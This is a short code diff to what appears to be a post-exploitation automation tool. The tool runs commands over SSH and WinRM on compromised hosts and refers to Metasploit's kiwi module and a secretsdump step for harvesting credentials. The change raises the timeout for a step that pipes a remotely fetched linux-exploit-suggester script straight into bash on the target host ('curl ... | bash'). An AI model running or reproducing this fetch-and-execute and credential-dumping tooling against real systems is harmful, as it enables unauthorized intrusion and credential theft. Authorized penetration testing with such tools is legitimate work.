@@ -29,6 +29,8 @@ POSTEX_JSON = STATE_DIR / "postex.json"
 
 # Timeout (seconds) for individual post-ex commands sent over WinRM or SSH
 CMD_TIMEOUT    = 30
+# Timeout for linux-exploit-suggester (curl + bash pipe needs more time)
+LES_TIMEOUT    = 90
 # Timeout for the full Metasploit RC script run (kiwi can be slow)
 MSF_TIMEOUT    = 120
 # Timeout for secretsdump subprocess
@@ -369,7 +371,7 @@ def _run_ssh_postex(
     les_cmd = f"curl -s --max-time 15 {LES_URL} | bash 2>/dev/null"
     print(f"[postex]   Running linux-exploit-suggester (curl pipe)...")
     try:
-        _stdin, stdout, stderr = client.exec_command(les_cmd, timeout=60)
+        _stdin, stdout, stderr = client.exec_command(les_cmd, timeout=LES_TIMEOUT)
         les_out = stdout.read().decode(errors="replace").strip()
         les_err = stderr.read().decode(errors="replace").strip()
         les_output = les_out or les_err or "(no output or no internet access)"
